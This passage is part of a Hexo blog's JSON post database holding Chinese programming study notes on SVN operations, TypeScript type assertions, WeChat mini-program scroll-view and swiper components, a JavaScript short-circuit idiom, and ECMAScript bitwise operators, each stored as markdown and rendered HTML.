地址</li>\n</ol>\n<p>弹出<code>用户名</code> <code>密码验证</code></p>\n<h3 id=\"Add-增加\"><a href=\"#Add-增加\" class=\"headerlink\" title=\"Add 增加\"></a>Add 增加</h3><ol>\n<li><p>先提交到变更列表，再 <code>commit</code> 到配置库：选择<code>新增文件</code>，右键SVN菜单执行<code>Add</code>， 提交到<code>变更列表</code>，然后右键SVN菜单执行<code>SVN Commit</code>提交到版本库</p>\n</li>\n<li><p>不提交到变更列表，直接commit配置库：直接选择文件，右键SVN菜单执行<code>SVN Commit</code>操作。</p>\n</li>\n</ol>\n<h3 id=\"Delete-删除\"><a href=\"#Delete-删除\" class=\"headerlink\" title=\"Delete 删除\"></a>Delete 删除</h3><p>如果被删文件 未入版本库，可直接使用操作系统删除</p>\n<p>如果被删文件 已入版本库：</p>\n<ol>\n<li>选择被删文件， 右键 SVN菜单 执行<code>delete</code>操作</li>\n<li>选择被删文件父级目录， 右键 SVN菜单 执行<code>SVN Commit</code></li>\n</ol>\n<h3 id=\"Rename-改名\"><a href=\"#Rename-改名\" class=\"headerlink\" title=\"Rename 改名\"></a>Rename 改名</h3><h3 id=\"SVN-Revert-还原\"><a href=\"#SVN-Revert-还原\" class=\"headerlink\" title=\"SVN Revert 还原\"></a>SVN Revert 还原</h3><p>右键SVN菜单 <code>Update to reversion</code></p>\n"},{"title":"TS断言","date":"2018-05-24T06:55:21.000Z","_content":"当出现一些类型无法被识别，或提示没有某些属性时，可以使用断言，进行`强制类型转换`\n\n````\n(this.$router as any)\n````","source":"_posts/TypeScript/TS断言.md","raw":"---\ntitle: TS断言\ndate: 2018-05-24 14:55:21\ntags: ts断言\ncategories: TS\n---\n当出现一些类型无法被识别，或提示没有某些属性时，可以使用断言，进行`强制类型转换`\n\n````\n(this.$router as any)\n````","slug":"TypeScript/TS断言","published":1,"updated":"2018-09-05T06:33:18.508Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwj004tzodvvn1oyd59","content":"<p>当出现一些类型无法被识别，或提示没有某些属性时，可以使用断言，进行<code>强制类型转换</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(this.$router as any)</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>当出现一些类型无法被识别，或提示没有某些属性时，可以使用断言，进行<code>强制类型转换</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(this.$router as any)</span><br></pre></td></tr></table></figure>"},{"title":"WxApp学习笔记1","date":"2018-06-06T04:16:14.000Z","_content":"## 一、简介\n+ 前端\n  + PC\n    + WEB\n    + OS-Native(Windows/Unix[Linux/MaxOS])\n  + MB\n    + WAP\n    + hybrid\n    + OS-Native(Android/ios)\n    + WXApp(微信小程序)\n+ 后台\n  + Server\n    + Java\n    + PHP\n    + NodeJS\n    + Python\n    + Golang\n    + Ruby\n    + ...\n  + DataBase\n    + SQL\n      + MySQL\n      + MsSQL\n      + ...\n    + NoSQL\n      + MongoDB\n      + Redis\n      + ...\n\n## 二、小程序开发工具下载安装\n  百度小程序开发下载工具，默认安装即可\n\n## 三、组件\n### **scroll-view**\n| 属性名 | 类型 | 默认值 | 说明 |\n| :-: | :-: | :-: | :-: |\n| scroll-x | Boolean | false | 横向滚动 |\n| scroll-y | Boolean | false | 纵向滚动 |\n| upper-threshold | Number | 50 | 距`顶部/左边`??px, 触发 scrolltoupper 事件 |\n| lower-threshold | Number | 50 | 距`底部/右边`??px, 触发 scrolltolower 事件 |\n| scroll-top | Number |  | 控制横向滚动条位置 |\n| scroll-left | Number |  | 控制纵向滚动条位置 |\n| scroll-into-view | String |  | 值为子元素ID,表现为: 元素对齐滚动区域顶部 |\n| bindscrolltoupper | EventHandle |  | 滚动到顶部/左边,触发`scrolltoupper` 事件 |\n| bindscrolltolower | EventHandle |  | 滚动到底部/右边,触发`scrolltolower` 事件 |\n| bindscroll | EventHandle |  | 滚动过程中触发`scroll` 事件, event.detail = {scrollLeft/Top/Width/Height、detailX/Y} |\n\n\n### **swiper**\n子元素只有\\<swiper-item/>组件,其余节点会被自动删除。\n\n\\<swiper-item/>只可放置在\\<swiper/>组件中，宽高自动100%。\n\n| 属性名 | 类型 | 默认值 | 说明 |\n| :-: | :-: | :-: | :-: |\n| indicator | Boolean | false | 控制显示面板指示点 |\n| autoplay | Boolean | false | 自动切换 |\n| current | Number | 0 | 切换到指定 index |\n| interval | Number | 5000 | 自动切换时间间隔 |\n| duration | Number | 1000 | 过渡动画时长 |\n| bindchange | EventHandle |  | current 改变触发`change` 事件, event.detail = {current: current} |\n","source":"_posts/WXApp/WxApp学习笔记1.md","raw":"---\ntitle: WxApp学习笔记1\ndate: 2018-06-06 12:16:14\ntags: WX小程序\ncategories: WxApp\n---\n## 一、简介\n+ 前端\n  + PC\n    + WEB\n    + OS-Native(Windows/Unix[Linux/MaxOS])\n  + MB\n    + WAP\n    + hybrid\n    + OS-Native(Android/ios)\n    + WXApp(微信小程序)\n+ 后台\n  + Server\n    + Java\n    + PHP\n    + NodeJS\n    + Python\n    + Golang\n    + Ruby\n    + ...\n  + DataBase\n    + SQL\n      + MySQL\n      + MsSQL\n      + ...\n    + NoSQL\n      + MongoDB\n      + Redis\n      + ...\n\n## 二、小程序开发工具下载安装\n  百度小程序开发下载工具，默认安装即可\n\n## 三、组件\n### **scroll-view**\n| 属性名 | 类型 | 默认值 | 说明 |\n| :-: | :-: | :-: | :-: |\n| scroll-x | Boolean | false | 横向滚动 |\n| scroll-y | Boolean | false | 纵向滚动 |\n| upper-threshold | Number | 50 | 距`顶部/左边`??px, 触发 scrolltoupper 事件 |\n| lower-threshold | Number | 50 | 距`底部/右边`??px, 触发 scrolltolower 事件 |\n| scroll-top | Number |  | 控制横向滚动条位置 |\n| scroll-left | Number |  | 控制纵向滚动条位置 |\n| scroll-into-view | String |  | 值为子元素ID,表现为: 元素对齐滚动区域顶部 |\n| bindscrolltoupper | EventHandle |  | 滚动到顶部/左边,触发`scrolltoupper` 事件 |\n| bindscrolltolower | EventHandle |  | 滚动到底部/右边,触发`scrolltolower` 事件 |\n| bindscroll | EventHandle |  | 滚动过程中触发`scroll` 事件, event.detail = {scrollLeft/Top/Width/Height、detailX/Y} |\n\n\n### **swiper**\n子元素只有\\<swiper-item/>组件,其余节点会被自动删除。\n\n\\<swiper-item/>只可放置在\\<swiper/>组件中，宽高自动100%。\n\n| 属性名 | 类型 | 默认值 | 说明 |\n| :-: | :-: | :-: | :-: |\n| indicator | Boolean | false | 控制显示面板指示点 |\n| autoplay | Boolean | false | 自动切换 |\n| current | Number | 0 | 切换到指定 index |\n| interval | Number | 5000 | 自动切换时间间隔 |\n| duration | Number | 1000 | 过渡动画时长 |\n| bindchange | EventHandle |  | current 改变触发`change` 事件, event.detail = {current: current} |\n","slug":"WXApp/WxApp学习笔记1","published":1,"updated":"2018-09-05T06:33:18.509Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwl004uzodv9n20gei8","content":"<h2 id=\"一、简介\"><a href=\"#一、简介\" class=\"headerlink\" title=\"一、简介\"></a>一、简介</h2><ul>\n<li>前端<ul>\n<li>PC<ul>\n<li>WEB</li>\n<li>OS-Native(Windows/Unix[Linux/MaxOS])</li>\n</ul>\n</li>\n<li>MB<ul>\n<li>WAP</li>\n<li>hybrid</li>\n<li>OS-Native(Android/ios)</li>\n<li>WXApp(微信小程序)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>后台<ul>\n<li>Server<ul>\n<li>Java</li>\n<li>PHP</li>\n<li>NodeJS</li>\n<li>Python</li>\n<li>Golang</li>\n<li>Ruby</li>\n<li>…</li>\n</ul>\n</li>\n<li>DataBase<ul>\n<li>SQL<ul>\n<li>MySQL</li>\n<li>MsSQL</li>\n<li>…</li>\n</ul>\n</li>\n<li>NoSQL<ul>\n<li>MongoDB</li>\n<li>Redis</li>\n<li>…</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"二、小程序开发工具下载安装\"><a href=\"#二、小程序开发工具下载安装\" class=\"headerlink\" title=\"二、小程序开发工具下载安装\"></a>二、小程序开发工具下载安装</h2><p>  百度小程序开发下载工具，默认安装即可</p>\n<h2 id=\"三、组件\"><a href=\"#三、组件\" class=\"headerlink\" title=\"三、组件\"></a>三、组件</h2><h3 id=\"scroll-view\"><a href=\"#scroll-view\" class=\"headerlink\" title=\"scroll-view\"></a><strong>scroll-view</strong></h3><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">属性名</th>\n<th style=\"text-align:center\">类型</th>\n<th style=\"text-align:center\">默认值</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">scroll-x</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">横向滚动</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-y</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">纵向滚动</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">upper-threshold</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">50</td>\n<td style=\"text-align:center\">距<code>顶部/左边</code>??px, 触发 scrolltoupper 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">lower-threshold</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">50</td>\n<td style=\"text-align:center\">距<code>底部/右边</code>??px, 触发 scrolltolower 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-top</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">控制横向滚动条位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-left</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">控制纵向滚动条位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-into-view</td>\n<td style=\"text-align:center\">String</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">值为子元素ID,表现为: 元素对齐滚动区域顶部</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscrolltoupper</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动到顶部/左边,触发<code>scrolltoupper</code> 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscrolltolower</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动到底部/右边,触发<code>scrolltolower</code> 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscroll</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动过程中触发<code>scroll</code> 事件, event.detail = {scrollLeft/Top/Width/Height、detailX/Y}</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"swiper\"><a href=\"#swiper\" class=\"headerlink\" title=\"swiper\"></a><strong>swiper</strong></h3><p>子元素只有\\<swiper-item>组件,其余节点会被自动删除。</swiper-item></p>\n<p>\\<swiper-item>只可放置在\\<swiper>组件中，宽高自动100%。</swiper></swiper-item></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">属性名</th>\n<th style=\"text-align:center\">类型</th>\n<th style=\"text-align:center\">默认值</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">indicator</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">控制显示面板指示点</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">autoplay</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">自动切换</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">current</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">切换到指定 index</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">interval</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">5000</td>\n<td style=\"text-align:center\">自动切换时间间隔</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">duration</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">1000</td>\n<td style=\"text-align:center\">过渡动画时长</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindchange</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">current 改变触发<code>change</code> 事件, event.detail = {current: current}</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一、简介\"><a href=\"#一、简介\" class=\"headerlink\" title=\"一、简介\"></a>一、简介</h2><ul>\n<li>前端<ul>\n<li>PC<ul>\n<li>WEB</li>\n<li>OS-Native(Windows/Unix[Linux/MaxOS])</li>\n</ul>\n</li>\n<li>MB<ul>\n<li>WAP</li>\n<li>hybrid</li>\n<li>OS-Native(Android/ios)</li>\n<li>WXApp(微信小程序)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>后台<ul>\n<li>Server<ul>\n<li>Java</li>\n<li>PHP</li>\n<li>NodeJS</li>\n<li>Python</li>\n<li>Golang</li>\n<li>Ruby</li>\n<li>…</li>\n</ul>\n</li>\n<li>DataBase<ul>\n<li>SQL<ul>\n<li>MySQL</li>\n<li>MsSQL</li>\n<li>…</li>\n</ul>\n</li>\n<li>NoSQL<ul>\n<li>MongoDB</li>\n<li>Redis</li>\n<li>…</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"二、小程序开发工具下载安装\"><a href=\"#二、小程序开发工具下载安装\" class=\"headerlink\" title=\"二、小程序开发工具下载安装\"></a>二、小程序开发工具下载安装</h2><p>  百度小程序开发下载工具，默认安装即可</p>\n<h2 id=\"三、组件\"><a href=\"#三、组件\" class=\"headerlink\" title=\"三、组件\"></a>三、组件</h2><h3 id=\"scroll-view\"><a href=\"#scroll-view\" class=\"headerlink\" title=\"scroll-view\"></a><strong>scroll-view</strong></h3><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">属性名</th>\n<th style=\"text-align:center\">类型</th>\n<th style=\"text-align:center\">默认值</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">scroll-x</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">横向滚动</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-y</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">纵向滚动</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">upper-threshold</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">50</td>\n<td style=\"text-align:center\">距<code>顶部/左边</code>??px, 触发 scrolltoupper 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">lower-threshold</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">50</td>\n<td style=\"text-align:center\">距<code>底部/右边</code>??px, 触发 scrolltolower 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-top</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">控制横向滚动条位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-left</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">控制纵向滚动条位置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">scroll-into-view</td>\n<td style=\"text-align:center\">String</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">值为子元素ID,表现为: 元素对齐滚动区域顶部</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscrolltoupper</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动到顶部/左边,触发<code>scrolltoupper</code> 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscrolltolower</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动到底部/右边,触发<code>scrolltolower</code> 事件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindscroll</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">滚动过程中触发<code>scroll</code> 事件, event.detail = {scrollLeft/Top/Width/Height、detailX/Y}</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"swiper\"><a href=\"#swiper\" class=\"headerlink\" title=\"swiper\"></a><strong>swiper</strong></h3><p>子元素只有\\<swiper-item>组件,其余节点会被自动删除。</swiper-item></p>\n<p>\\<swiper-item>只可放置在\\<swiper>组件中，宽高自动100%。</swiper></swiper-item></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">属性名</th>\n<th style=\"text-align:center\">类型</th>\n<th style=\"text-align:center\">默认值</th>\n<th style=\"text-align:center\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">indicator</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">控制显示面板指示点</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">autoplay</td>\n<td style=\"text-align:center\">Boolean</td>\n<td style=\"text-align:center\">false</td>\n<td style=\"text-align:center\">自动切换</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">current</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">切换到指定 index</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">interval</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">5000</td>\n<td style=\"text-align:center\">自动切换时间间隔</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">duration</td>\n<td style=\"text-align:center\">Number</td>\n<td style=\"text-align:center\">1000</td>\n<td style=\"text-align:center\">过渡动画时长</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bindchange</td>\n<td style=\"text-align:center\">EventHandle</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">current 改变触发<code>change</code> 事件, event.detail = {current: current}</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"语法逻辑判断","date":"2018-11-23T02:34:43.000Z","_content":"## if语法的简单判断(以下语句等价)\n````\n  if (this.state.interval) { window.clearInterval(this.state.interval) }\n  !!this.state.interval && window.clearInterval(this.state.interval)\n  demo: !!this.state.interval && console.log('%c 123','color:red;font-size:30px');\n````\n","source":"_posts/programmingLanguage/语法逻辑判断.md","raw":"---\ntitle: 语法逻辑判断\ndate: 2018-11-23 10:34:43\ntags: \ncategories: ProgrammingLang\n---\n## if语法的简单判断(以下语句等价)\n````\n  if (this.state.interval) { window.clearInterval(this.state.interval) }\n  !!this.state.interval && window.clearInterval(this.state.interval)\n  demo: !!this.state.interval && console.log('%c 123','color:red;font-size:30px');\n````\n","slug":"programmingLanguage/语法逻辑判断","published":1,"updated":"2018-11-23T02:41:09.485Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwn004yzodvscujbkut","content":"<h2 id=\"if语法的简单判断-以下语句等价\"><a href=\"#if语法的简单判断-以下语句等价\" class=\"headerlink\" title=\"if语法的简单判断(以下语句等价)\"></a>if语法的简单判断(以下语句等价)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (this.state.interval) &#123; window.clearInterval(this.state.interval) &#125;</span><br><span class=\"line\">!!this.state.interval &amp;&amp; window.clearInterval(this.state.interval)</span><br><span class=\"line\">demo: !!this.state.interval &amp;&amp; console.log(&apos;%c 123&apos;,&apos;color:red;font-size:30px&apos;);</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"if语法的简单判断-以下语句等价\"><a href=\"#if语法的简单判断-以下语句等价\" class=\"headerlink\" title=\"if语法的简单判断(以下语句等价)\"></a>if语法的简单判断(以下语句等价)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (this.state.interval) &#123; window.clearInterval(this.state.interval) &#125;</span><br><span class=\"line\">!!this.state.interval &amp;&amp; window.clearInterval(this.state.interval)</span><br><span class=\"line\">demo: !!this.state.interval &amp;&amp; console.log(&apos;%c 123&apos;,&apos;color:red;font-size:30px&apos;);</span><br></pre></td></tr></table></figure>\n"},{"title":"位运算符","date":"2018-11-28T02:32:55.000Z","_content":"## [ECMAScript 位运算符](http://www.w3school.com.cn/js/pro_js_operators_bitwise.asp)\n\n### 位运算符是在数字底层（即表示数字的 32 个数位）进行操作的。\n\n---\n### 重温整数\n`ECMAScript` 整数有`两种类型`，即`有符号整数`（允许用正数和负数）和`无符号整数`（只允许用正数）。\n在 `ECMAScript` 中，所有`整数字面量`默认都是`有符号整数`，这意味着什么呢？\n\n`有符号整数`使用 `31` 位表示整数的`数值`，用第 `32` 位表示整数的`符号`，`0 表示正数`，`1 表示负数`。数值范围从 `-2147483648` 到 `2147483647`。\n\n可以以`两种不同的方式`存储 `二进制形式的有符号整数`，一种用于存储`正数`，一种用于存储`负数`。\n\n正数是以真二进制形式存储的，前 31 位中的每一位都表示 2 的幂，从第 1 位（位 0）开始，表示 20，第 2 位（位 1）表示 21。没用到的位用 0 填充，即忽略不计。例如，下图展示的是数 18 的表示法。\n\n18 的二进制版本只用了前 5 位，它们是这个数字的有效位。把数字转换成二进制字符串，就能看到有效位：\n````\nvar iNum = 18;\nalert(iNum.toString(2));  //输出 \"10010\"\n````\n\n这段代码只输出 `\"10010\"`，而不是 18 的 32 位表示。其他的数位并不重要，因为仅使用前 5 位即可确定这个十进制数值。如下图所示：\n> (2^4 * 1) + (2^3 * 0) + (2^2 * 0) + (2^1 * 1) + (2^0 * 0)\n\n负数也存储为二进制代码，不过采用的形式`是二进制补码`。计算数字二进制补码的步骤有三步：\n1. 确定该数字的非负版本的二进制表示（例如，要计算 -18的二进制补码，首先要确定 18 的二进制表示）\n\n要确定 -18 的二进制表示，首先必须得到 18 的二进制表示，如下所示：\n> 0000 0000 0000 0000 0000 0000 0001 0010\n\n2. 求得二进制反码，即要把 0 替换为 1，把 1 替换为 0\n\n接下来，计算二进制反码，如下所示：\n> 1111 1111 1111 1111 1111 1111 1110 1101\n\n3. 在二进制反码上加 1\n\n最后，在二进制反码上加 1，如下所示：\n````\n1111 1111 1111 1111 1111 1111 1110 1101\n                                      1\n---------------------------------------\n1111 1111 1111 1111 1111 1111 1110 1110\n````\n\n因此，-18 的二进制表示即 `1111 1111 1111 1111 1111 1111 1110 1110`。记住，在处理`有符号整数`时，开发者不能访问 `31` 位。\n\n有趣的是，把`负整数`转换成`二进制字符串`后，`ECMAScript` 并不以`二进制补码`的形式显示，而是用`数字绝对值`的`标准二进制代码`前面加`负号`的形式输出。例如：\n````\nvar iNum = -18;\nalert(iNum.toString(2));\t//输出 \"-10010\"\n````\n\n这段代码输出的是 `\"-10010\"`，而`非二进制补码`，这是为`避免访问位 31`。为了简便，ECMAScript 用一种简单的方式处理整数，使得开发者不必关心它们的用法。\n\n另一方面，`无符号整数`把 最后一位 作为 另一个 数位 处理。\n\n在这种模式中，第 `32` 位不表示`数字的符号`，而是`值 2^31`。由于这个`额外的位`，无符号整数的数值范围为 0 到 4294967295。对于小于 2147483647 的整数来说，无符号整数看来与有符号整数一样，而大于 2147483647 的整数则要使用位 31（在有符号整数中，这一位总是 0）。\n\n把无符号整数转换成字符串后，只返回它们的有效位。\n\n注意：所有整数字面量都默认存储为有符号整数。只有 ECMAScript 的位运算符才能创建无符号整数。\n\n---\n\n### 位运算 NOT(~)\n位运算 `NOT` 由否定号（`~`）表示，它是 `ECMAScript` 中为数不多的与`二进制算术`有关的运算符之一。\n\n位运算 NOT 是三步的处理过程：\n\n1. 把运算数转换成 32 位数字\n2. 把二进制数转换成它的二进制反码\n3. 把二进制数转换成浮点数\n\n例如：\n````\nvar iNum1 = 25;\t\t//25 等于 00000000000000000000000000011001\nvar iNum2 = ~iNum1;\t//转换为 11111111111111111111111111100110\nalert(iNum2);\t\t//输出 \"-26\"\n````\n\n位运算 NOT 实质上是对数字求负，然后减 1，因此 25 变 -26。用下面的方法也可以得到同样的方法：\n\n````\nvar iNum1 = 25;\nvar iNum2 = -iNum1 -1;\nalert(iNum2);\t//输出 -26\n````\n\n### 位运算 AND(&)\n位运算 `AND` 由和号（`&`）表示，直接对数字的二进制形式进行运算。它把每个`数字中的数位对齐`，然后用下面的规则对同一位置上的两个数位进行 AND 运算：\n\n### 位运算 OR(|)\n位运算 OR 由符号（|）表示，也是直接对数字的二进制形式进行运算。在计算每位时，OR 运算符采用下列规则：\n\n### 位运算 XOR(^)\n\n### 左移运算(<<)\n\n### 有符号右移运算(>>)\n\n### 无符号右移运算(>>>)\n正数 与 有符号右移运算 相同;\n负数 不同\n\n","source":"_posts/programmingLanguage/位运算符.md","raw":"---\ntitle: 位运算符\ndate: 2018-11-28 10:32:55\ntags: logical operation\ncategories: \n---\n## [ECMAScript 位运算符](http://www.w3school.com.cn/js/pro_js_operators_bitwise.asp)\n\n### 位运算符是在数字底层（即表示数字的 32 个数位）进行操作的。\n\n---\n### 重温整数\n`ECMAScript` 整数有`两种类型`，即`有符号整数`（允许用正数和负数）和`无符号整数`（只允许用正数）。\n在 `ECMAScript` 中，所有`整数字面量`默认都是`有符号整数`，这意味着什么呢？\n\n`有符号整数`使用 `31` 位表示整数的`数值`，用第 `32` 位表示整数的`符号`，`0 表示正数`，`1 表示负数`。数值范围从 `-2147483648` 到 `2147483647`。\n\n可以以`两种不同的方式`存储 `二进制形式的有符号整数`，一种用于存储`正数`，一种用于存储`负数`。\n\n正数是以真二进制形式存储的，前 31 位中的每一位都表示 2 的幂，从第 1 位（位 0）开始，表示 20，第 2 位（位 1）表示 21。没用到的位用 0 填充，即忽略不计。例如，下图展示的是数 18 的表示法。\n\n18 的二进制版本只用了前 5 位，它们是这个数字的有效位。把数字转换成二进制字符串，就能看到有效位：\n````\nvar iNum = 18;\nalert(iNum.toString(2));  //输出 \"10010\"\n````\n\n这段代码只输出 `\"10010\"`，而不是 18 的 32 位表示。其他的数位并不重要，因为仅使用前 5 位即可确定这个十进制数值。如下图所示：\n> (2^4 * 1) + (2^3 * 0) + (2^2 * 0) + (2^1 * 1) + (2^0 * 0)\n\n负数也存储为二进制代码，不过采用的形式`是二进制补码`。计算数字二进制补码的步骤有三步：\n1. 确定该数字的非负版本的二进制表示（例如，要计算 -18的二进制补码，首先要确定 18 的二进制表示）\n\n要确定 -18 的二进制表示，首先必须得到 18 的二进制表示，如下所示：\n> 0000 0000 0000 0000 0000 0000 0001 0010\n\n2. 求得二进制反码，即要把 0 替换为 1，把 1 替换为 0\n\n接下来，计算二进制反码，如下所示：\n> 1111 1111 1111 1111 1111 1111 1110 1101\n\n3. 在二进制反码上加 1\n\n最后，在二进制反码上加 1，如下所示：\n````\n1111 1111 1111 1111 1111 1111 1110 1101\n                                      1\n---------------------------------------\n1111 1111 1111 1111 1111 1111 1110 1110\n````\n\n因此，-18 的二进制表示即 `1111 1111 1111 1111 1111 1111 1110 1110`。记住，在处理`有符号整数`时，开发者不能访问 `31` 位。\n\n有趣的是，把`负整数`转换成`二进制字符串`后，`ECMAScript` 并不以`二进制补码`的形式显示，而是用`数字绝对值`的`标准二进制代码`前面加`负号`的形式输出。例如：\n````\nvar iNum = -18;\nalert(iNum.toString(2));\t//输出 \"-10010\"\n````\n\n这段代码输出的是 `\"-10010\"`，而`非二进制补码`，这是为`避免访问位 31`。为了简便，ECMAScript 用一种简单的方式处理整数，使得开发者不必关心它们的用法。\n\n另一方面，`无符号整数`把 最后一位 作为 另一个 数位 处理。\n\n在这种模式中，第 `32` 位不表示`数字的符号`，而是`值 2^31`。由于这个`额外的位`，无符号整数的数值范围为 0 到 4294967295。对于小于 2147483647 的整数来说，无符号整数看来与有符号整数一样，而大于 2147483647 的整数则要使用位 31（在有符号整数中，这一位总是 0）。\n\n把无符号整数转换成字符串后，只返回它们的有效位。\n\n注意：所有整数字面量都默认存储为有符号整数。只有 ECMAScript 的位运算符才能创建无符号整数。\n\n---\n\n### 位运算 NOT(~)\n位运算 `NOT` 由否定号（`~`）表示，它是 `ECMAScript` 中为数不多的与`二进制算术`有关的运算符之一。\n\n位运算 NOT 是三步的处理过程：\n\n1. 把运算数转换成 32 位数字\n2. 把二进制数转换成它的二进制反码\n3. 把二进制数转换成浮点数\n\n例如：\n````\nvar iNum1 = 25;\t\t//25 等于 00000000000000000000000000011001\nvar iNum2 = ~iNum1;\t//转换为 11111111111111111111111111100110\nalert(iNum2);\t\t//输出 \"-26\"\n````\n\n位运算 NOT 实质上是对数字求负，然后减 1，因此 25 变 -26。用下面的方法也可以得到同样的方法：\n\n````\nvar iNum1 = 25;\nvar iNum2 = -iNum1 -1;\nalert(iNum2);\t//输出 -26\n````\n\n### 位运算 